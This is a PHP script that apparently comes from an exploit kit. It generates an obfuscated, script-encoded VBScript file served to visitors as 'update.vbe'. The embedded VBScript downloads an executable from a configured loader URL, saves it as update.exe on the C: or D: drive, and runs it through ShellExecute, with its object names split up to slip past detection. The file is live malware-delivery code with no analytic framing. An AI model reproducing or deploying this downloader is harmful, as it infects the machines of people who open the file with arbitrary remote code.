<?
include'config.php';
include'functions.php';
detect_os();


$tab=array("0x09"=>array("0x64","0x37","0x69"),"0x20"=>array("0x50","0x7E","0x2C"),"0x21"=>array("0x22","0x5A","0x65"),"0x22"=>array("0x4A","0x45","0x72"),"0x23"=>array("0x61","0x3A","0x5B"),"0x24"=>array("0x5E","0x79","0x66"),"0x25"=>array("0x5D","0x59","0x75"),"0x26"=>array("0x5B","0x27","0x4C"),"0x27"=>array("0x42","0x76","0x45"),"0x28"=>array("0x60","0x63","0x76"),"0x29"=>array("0x23","0x62","0x2A"),"0x2A"=>array("0x65","0x4D","0x43"),"0x2B"=>array("0x5F","0x51","0x33"),"0x2C"=>array("0x7E","0x53","0x42"),"0x2D"=>array("0x4F","0x52","0x20"),"0x2E"=>array("0x52","0x20","0x63"),"0x2F"=>array("0x7A","0x26","0x4A"),"0x30"=>array("0x21","0x54","0x5A"),"0x31"=>array("0x46","0x71","0x38"),"0x32"=>array("0x20","0x2B","0x79"),"0x33"=>array("0x26","0x66","0x32"),"0x34"=>array("0x63","0x2A","0x57"),"0x35"=>array("0x2A","0x58","0x6C"),"0x36"=>array("0x76","0x7F","0x2B"),"0x37"=>array("0x47","0x7B","0x46"),"0x38"=>array("0x25","0x30","0x52"),"0x39"=>array("0x2C","0x31","0x4F"),"0x3A"=>array("0x29","0x6C","0x3D"),"0x3B"=>array("0x69","0x49","0x70"),"0x3C"=>array("0x3F","0x3F","0x3F"),"0x3D"=>array("0x27","0x78","0x7B"),"0x3E"=>array("0x3F","0x3F","0x3F"),"0x3F"=>array("0x67","0x5F","0x51"),"0x40"=>array("0x3F","0x3F","0x3F"),"0x41"=>array("0x62","0x29","0x7A"),"0x42"=>array("0x41","0x24","0x7E"),"0x43"=>array("0x5A","0x2F","0x3B"),"0x44"=>array("0x66","0x39","0x47"),"0x45"=>array("0x32","0x33","0x41"),"0x46"=>array("0x73","0x6F","0x77"),"0x47"=>array("0x4D","0x21","0x56"),"0x48"=>array("0x43","0x75","0x5F"),"0x49"=>array("0x71","0x28","0x26"),"0x4A"=>array("0x39","0x42","0x78"),"0x4B"=>array("0x7C","0x46","0x6E"),"0x4C"=>array("0x53","0x4A","0x64"),"0x4D"=>array("0x48","0x5C","0x74"),"0x4E"=>array("0x31","0x48","0x67"),"0x4F"=>array("0x72","0x36","0x7D"),"0x50"=>array("0x6E","0x4B","0x68"),"0x51"=>array("0x70","0x7D","0x35"),"0x52"=>array("0x49","0x5D","0x22"),"0x53"=>array("0x3F","0x6A","0x55"),"0x54"=>array("0x4B","0x50","0x3A"),"0x55"=>array("0x6A","0x69","0x60"),"0x56"=>array("0x2E","0x23","0x6A"),"0x57"=>array("0x7F","0x09","0x71"),"0x58"=>array("0x28","0x70","0x6F"),"0x59"=>array("0x35","0x65","0x49"),"0x5A"=>array("0x7D","0x74","0x5C"),"0x5B"=>array("0x24","0x2C","0x5D"),"0x5C"=>array("0x2D","0x77","0x27"),"0x5D"=>array("0x54","0x44","0x59"),"0x5E"=>array("0x37","0x3F","0x25"),"0x5F"=>array("0x7B","0x6D","0x7C"),"0x60"=>array("0x3D","0x7C","0x23"),"0x61"=>array("0x6C","0x43","0x6D"),"0x62"=>array("0x34","0x38","0x28"),"0x63"=>array("0x6D","0x5E","0x31"),"0x64"=>array("0x4E","0x5B","0x39"),"0x65"=>array("0x2B","0x6E","0x7F"),"0x66"=>array("0x30","0x57","0x36"),"0x67"=>array("0x6F","0x4C","0x54"),"0x68"=>array("0x74","0x34","0x34"),"0x69"=>array("0x6B","0x72","0x62"),"0x6A"=>array("0x4C","0x25","0x4E"),"0x6B"=>array("0x33","0x56","0x30"),"0x6C"=>array("0x56","0x73","0x5E"),"0x6D"=>array("0x3A","0x68","0x73"),"0x6E"=>array("0x78","0x55","0x09"),"0x6F"=>array("0x57","0x47","0x4B"),"0x70"=>array("0x77","0x32","0x61"),"0x71"=>array("0x3B","0x35","0x24"),"0x72"=>array("0x44","0x2E","0x4D"),"0x73"=>array("0x2F","0x64","0x6B"),"0x74"=>array("0x59","0x4F","0x44"),"0x75"=>array("0x45","0x3B","0x21"),"0x76"=>array("0x5C","0x2D","0x37"),"0x77"=>array("0x68","0x41","0x53"),"0x78"=>array("0x36","0x61","0x58"),"0x79"=>array("0x58","0x7A","0x48"),"0x7A"=>array("0x79","0x22","0x2E"),"0x7B"=>array("0x09","0x60","0x50"),"0x7C"=>array("0x75","0x6B","0x2D"),"0x7D"=>array("0x38","0x4E","0x29"),"0x7E"=>array("0x55","0x3D","0x3F")); 
$pos=array("0x00"=>"0x01","0x20"=>"0x01","0x01"=>"0x02","0x21"=>"0x01","0x02"=>"0x00","0x22"=>"0x00","0x03"=>"0x01","0x23"=>"0x02","0x04"=>"0x02","0x24"=>"0x00","0x05"=>"0x00","0x25"=>"0x02","0x06"=>"0x02","0x26"=>"0x00","0x07"=>"0x00","0x27"=>"0x01","0x08"=>"0x00","0x28"=>"0x00","0x09"=>"0x02","0x29"=>"0x01","0x0A"=>"0x00","0x2A"=>"0x01","0x0B"=>"0x02","0x2B"=>"0x02","0x0C"=>"0x01","0x2C"=>"0x00","0x0D"=>"0x00","0x2D"=>"0x01","0x0E"=>"0x02","0x2E"=>"0x00","0x0F"=>"0x00","0x2F"=>"0x02","0x10"=>"0x01","0x30"=>"0x01","0x11"=>"0x00","0x31"=>"0x00","0x12"=>"0x02","0x32"=>"0x02","0x13"=>"0x00","0x33"=>"0x00","0x14"=>"0x01","0x34"=>"0x01","0x15"=>"0x01","0x35"=>"0x01","0x16"=>"0x02","0x36"=>"0x02","0x17"=>"0x00","0x37"=>"0x00","0x18"=>"0x00","0x38"=>"0x00","0x19"=>"0x02","0x39"=>"0x01","0x1A"=>"0x01","0x3A"=>"0x01","0x1B"=>"0x00","0x3B"=>"0x02","0x1C"=>"0x02","0x3C"=>"0x00","0x1D"=>"0x00","0x3D"=>"0x01","0x1E"=>"0x00","0x3E"=>"0x00","0x1F"=>"0x02","0x3F"=>"0x02");

if ($os == "Windows Vista") $path="d:\update.exe";
else $path="c:\update.exe";

$fp='UrrrrRL = "'.$load.'?spl=soc_pack"
file = "'.$path.'"
Lx = "M"
Mx = Lx+"SX"+Lx+"L2.X"+Lx+"LHTTP"
Set XXXXXHHHTTT = CreateObject(Mx)
XXXXXHHHTTT.Open "GET", UrrrrRL, 0
XXXXXHHHTTT.Send
Ax = "AD"
Aax = "OD"
Bx = "B.St"
Cx = "re"+"am"
CLx = Ax+Aax+Bx+Cx
Set adSSSSTTTTTT = CreateObject(CLx)
adSSSSTTTTTT.Mode = 3
adSSSSTTTTTT.Type = 1
adSSSSTTTTTT.Open
adSSSSTTTTTT.Write XXXXXHHHTTT.responseBody
ASSx = "e"
ASS = "adSSSSTTTTTT.Sav"+ASSx+"ToFil"+ASSx+" fil"+ASSx+", 2"
Eval(AAS)
Qw = "l"
Aw = "i"
Endw = "She"+Qw+Qw+".App"+Qw+Aw+"cat"+Aw+"on"
Set TTTEEEMMMPP11 = CreateObject(Endw)
EnddC = "WScr"+Aw+"pt.She"+Qw+Qw
set WShell = CreateObject(EnddC)
TTTEEEMMMPP11.ShellExecute file, "" , "", "", 1 ';

$k=-5;
$str="";
do {
    $all++;
	$sum+=ord($l);
	$l = $fp[$X];
	$code=strtoupper(dechex(ord($l)));	
	$pref="";
	if ($c%64<16)	$pref='0';
	$posi=$pos["0x".$pref.strtoupper(dechex($c%64))];	
	if ($l!="\n" && $l!="\r"){
		$p=$tab["0x".$code][hexdec($posi)];
		$str.=chr(hexdec($p));
	}else{
		if ($l=="\n")	$str.="@&";
		if ($l=="\r")   $str.="@#";
		$all++;
	}
	$c++;   
	$X++;
} while (isset($fp[$X]));

	$all=$all-1;
	$s[0]=floor($all/16777216);
	$s[1]=floor($all/65536);
	$s[2]=floor($all/256);
	$s[3]=$all%256;
	
	$ch[0]=floor($sum/16777216);
	$ch[1]=floor($sum/65536);
	$ch[2]=floor($sum/256);
	$ch[3]=$sum%256;

	$lenght=chr($s[3]).chr($s[2]).chr($s[1]).chr($s[0]);
	$checksum=chr($ch[3]).chr($ch[2]).chr($ch[1]).chr($ch[0]);

	$alen = base64_encode($lenght);
	$asum = base64_encode($checksum);
	$ccc="";
	for ($i=0;$i<strlen($str)-1;$i++)	$ccc.=$str[$i];
	$strTOTAL="#@~^".$alen.$ccc.$asum."^#~@";	




header("Content-Disposition: inline; filename=update.vbe");
header("\r\n");
header("Content-Type: application/octet-stream\r\n\r\n");;
echo($strTOTAL);
?>
